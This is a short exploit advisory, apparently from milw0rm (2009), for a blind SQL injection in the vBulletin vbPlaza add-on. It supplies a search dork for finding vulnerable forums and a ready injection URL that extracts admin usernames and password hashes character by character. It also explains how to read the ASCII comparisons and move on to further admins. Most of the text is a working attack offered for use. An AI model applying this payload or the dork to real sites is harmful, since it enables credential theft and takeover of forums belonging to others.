@@ -1,0 +1,26 @@
+--==+======================================================================================================================+==--
+--==+                  vBulletin vbBux/vbPlaza <= 2.x (vbplaza.php) Remote Blind SQL Injection Vulnerability                +==--
+--==+======================================================================================================================+==--
+
+AUTHOR: Cold z3ro & Crck_Man
+SITE: www.vbPlaza.com
+DORK: inurl:"vbplaza.php?do=*"
+
+DESCRIPTION: Blind SQL Injection in name of vbplaza.php a mod for vBulletin, able to retrieve admin hash
+
+EXPLOIT: 
+http://www.site.com/forum/vbplaza.php?do=item&name=bank'/**/and 58<ascii(substring((SELECT concat(password,0x3a,username) from user limit 0,1),33,1))/*
+
+IE: ascii encodes
+	58  => :
+	48  => 0
+	120 => x
+
+NOTE: You'll need to be logged into the forum to exploit vbplaza.php. Increment the limit to get the next admin .
+
+
+Copyrights : www.hackteach.org , www.h-t.cc
+
+Greetz : www.hackteach.[org/net] , www.islam-attack.com , www.s3curi7y.com , www.xp10.biz , Friends 
+
+# milw0rm.com [2009-05-26]
